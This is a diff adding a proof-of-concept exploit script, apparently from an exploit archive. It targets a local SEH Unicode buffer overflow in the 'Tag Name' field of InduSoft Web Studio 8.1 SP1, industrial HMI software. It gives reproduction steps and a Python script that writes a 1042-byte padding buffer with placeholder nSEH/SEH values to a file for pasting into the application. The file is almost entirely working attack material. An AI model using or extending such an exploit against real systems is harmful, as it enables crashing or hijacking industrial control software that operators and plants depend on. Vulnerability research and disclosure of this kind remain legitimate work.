@@ -1,0 +1,25 @@
+# Exploit Title: InduSoft Web Studio 8.1 SP1 - 'Tag Name' Buffer Overflow (SEH)
+# Discovery by: Luis Martinez
+# Discovery Date: 2018-09-11
+# Vendor Homepage: http://www.indusoft.com/
+# Software Link: http://www.indusoft.com/Products-Downloads
+# Tested Version: 8.1 SP1
+# Vulnerability Type: Local Buffer Overflow (SEH Unicode)
+# Tested on OS: Windows 10 Pro x64 en
+ 
+# Steps to Produce the Local Buffer Overflow (SEH Unicode): 
+# 1.- Run python code: InduSoft_Web_Studio_8.1.py
+# 2.- Open InduSoft_Web_Studio_8.1.txt and copy content to clipboard
+# 3.- Open IWS v8.1 InduSoft Web Studio
+# 4.- Home
+# 5.- Paste ClipBoard on "Tag Name"
+ 
+#!/usr/bin/env python
+
+nSEH = "\x42\x42"
+SEH = "\x43\x43"
+ 
+buffer = "\x41" * 1042 + nSEH + SEH
+f = open ("InduSoft_Web_Studio_8.1.txt", "w")
+f.write(buffer)
+f.close()
